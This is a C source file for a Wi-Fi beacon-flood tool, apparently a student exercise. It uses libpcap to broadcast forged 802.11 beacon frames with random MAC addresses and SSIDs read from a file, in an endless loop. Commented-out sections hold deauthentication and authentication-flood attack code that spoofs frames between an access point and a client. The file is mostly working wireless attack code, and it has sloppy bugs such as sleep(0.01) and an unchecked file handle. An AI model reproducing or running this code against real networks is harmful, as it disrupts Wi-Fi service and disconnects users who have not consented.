#include "ieee80211_h.h"

struct Para para;
//bool pcap_print(u_char *buf);

void usage() {
	printf("syntax: beacon-flood <interface> <ssid-list-file>\n");
	printf("sample: beacon-flood mon0 ssid-list.txt\n");
}
typedef struct {
        char* dev_;
} Param;
Param param  = {
	.dev_ = NULL
};

bool parse(Param* param, int argc, char* argv[]) {
	if (argc < 2) {
		usage();
		return false;
	}
	param->dev_ = argv[1];
    //putMac(&para.ap,argv[2]);//para.ap = mac - static option
	return true;
}

int main(int argc, char* argv[]) {
	if (!parse(&param, argc, argv))
		return -1;

    int ssid_num = 0;
    FILE *fp = fopen(argv[2],"r");
    if(fp){
        printf("Suc");
    }else
        printf("fail");
    char buf[10][1000];
    while(1){
        if(fgets(buf[ssid_num],1000,fp) == NULL){
            break;
        }
        ssid_num++;
    }
    int bit = 0;

	char errbuf[PCAP_ERRBUF_SIZE];
    char frame_buf[BUFSIZ];
    
	pcap_t* pcap = pcap_open_live(param.dev_, BUFSIZ, 1, 1000, errbuf);
	if (pcap == NULL) {
		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
		return -1;
	}
    
    char send_buf[1000];
    int mac_rand;
//    u_int8_t test_temp = reinterpret_cast<u_int8_t>(strlen(buf[0]));
    while(1){
        for(int t =0; t < ssid_num; t++)
        {
		mac_rand = rand();
       	    	u_int8_t ttemp = strlen(buf[t]) - 1;
            	memcpy(send_buf,BEACON,BEACON_SIZE);
            	memcpy(&send_buf[24],&mac_rand,4);
            	memcpy(&send_buf[24 + 6],&mac_rand,4);
            	memcpy(&send_buf[BEACON_SIZE-1],&ttemp,1);//strlen copy
            	memcpy(&send_buf[BEACON_SIZE],&buf[t],strlen(buf[t])-1);
            	memcpy(&send_buf[BEACON_SIZE + strlen(buf[t]) -1],PARA,PARA_LEN);
            	pcap_sendpacket(pcap,reinterpret_cast<const u_char*>(send_buf),BEACON_SIZE + strlen(buf[t])-1 + PARA_LEN);
            	sleep(0.01);
        }
    }
    /*
    u_int8_t ttemp = strlen(buf[1]) - 1;
    //ttemp = (ttemp<<4) || (ttemp >> 4);
    printf("\n thie - %.2x\n",ttemp); 
    memcpy(send_buf,BEACON,BEACON_SIZE);
    memcpy(&send_buf[BEACON_SIZE-1],&ttemp,1);//strlen copy
    //memcpy(&send_buf[BEACON_SIZE + 2],"0x09",1);//strlen
    memcpy(&send_buf[BEACON_SIZE],&buf[1],strlen(buf[1])-1);
    memcpy(&send_buf[BEACON_SIZE + strlen(buf[1]) -1],PARA,PARA_LEN);
    printf("fdasf\n");
    fflush(stdout);
    for(int i=0; i < BEACON_SIZE + strlen(buf[1]) -1 + PARA_LEN;i++){
        if(i % 16 == 0){
            printf("\n");
            fflush(stdout);
        }
        else if(i % 8 == 0){
            printf(" ");
            fflush(stdout);
        }
        printf("%.2x",send_buf[i]);
        fflush(stdout);
    }
    while(1)
    {
        pcap_sendpacket(pcap,reinterpret_cast<const u_char*>(send_buf),BEACON_SIZE + strlen(buf[1])-1 + PARA_LEN);
        sleep(0.1);
    }
    */
    return 0;
    /*
    //printMac(&para.ap);
    //printMac(&para.sta);
    while(1)
    {
        if(para.pbit[1] == 1){//if auth Attack
            memcpy(frame_buf,AUTH_REQ,43);
            memcpy(&frame_buf[13+4],&para.ap,6);
            memcpy(&frame_buf[13+4+6],&para.sta,6);
            memcpy(&frame_buf[13+4+6+6],&para.ap,6);
            pcap_sendpacket(pcap,reinterpret_cast<const u_char*>(frame_buf),43);
            for(int i=0; i < 26;i++){
                printf("%.2x",(unsigned int)frame_buf[i]);
            }
            printf("\n");
        }else{//if deauth Attack
            if(para.pbit[0] == 1){// ucast
                memcpy(frame_buf,DEAUTH_REQ,26+13);
                if(bit == 0){//ap -> sta
                    bit = 1; 
                    memcpy(&frame_buf[13+4],&para.sta,6);
                    memcpy(&frame_buf[13+4+6],&para.ap,6);
                    memcpy(&frame_buf[13+4+6+6],&para.ap,6);
                }else{//sta->ap
                    bit = 0; 
                    memcpy(&frame_buf[13+4],&para.ap,6);
                    memcpy(&frame_buf[13+4+6],&para.sta,6);
                    memcpy(&frame_buf[13+4+6+6],&para.ap,6);
                }
                for(int i=0; i < 26;i++){
                    printf("%.2x",(unsigned int)frame_buf[i]);
                }
            	printf("\n");
            }else{//bcast
                memcpy(frame_buf,DEAUTH_REQ,26+13);
                memcpy(&frame_buf[13+4+6],&para.ap,6);
                memcpy(&frame_buf[13+4+6+6],&para.ap,6);
            }
            pcap_sendpacket(pcap,reinterpret_cast<const u_char*>(frame_buf),26+13);
        }
        //send packet
        sleep(0.1);
    }
	pcap_close(pcap);
    */
}
